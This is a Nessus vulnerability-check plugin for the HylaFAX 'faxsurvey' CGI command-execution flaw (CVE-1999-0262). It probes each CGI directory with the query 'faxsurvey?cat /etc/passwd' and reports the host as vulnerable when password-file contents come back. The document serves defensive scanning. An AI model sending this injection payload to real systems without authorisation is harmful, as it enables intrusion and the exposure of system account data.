#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10067);
 script_version ("$Revision: 1.34 $");
 script_cve_id("CVE-1999-0262");
 script_bugtraq_id(2056);
 script_xref(name:"OSVDB", value:"58");

 script_name(english:"HylaFAX faxsurvey Arbitrary Command Execution");
 script_summary(english:"Checks if faxsurvey is vulnerable");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application on the remote host has an arbitrary command\n",
     "execution vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The 'faxsurvey' CGI does not sanitize input to the query string.  A\n",
     "remote attacker could exploit this to execute arbitrary commands."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1998_3/0385.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Remove this CGI from the server."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 req = string(dir, "/faxsurvey?cat%20/etc/passwd");
 result = http_send_recv3(method:"GET", item:req, port:port);
 if (isnull(result)) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:result[2]))
 {
   if (report_verbosity > 0)
   {
     report = string(
       "\n",
       "Nessus exploited this issue by requesting the following URL :\n\n",
       "  ", build_url(qs:req, port:port), "\n"
     );

     if (report_verbosity > 1)
       report += string("\nWhich yielded :\n\n", result[2], "\n");

     security_hole(port:port, extra:report);
   }
   else security_hole(port);

   exit(0);
 }
}
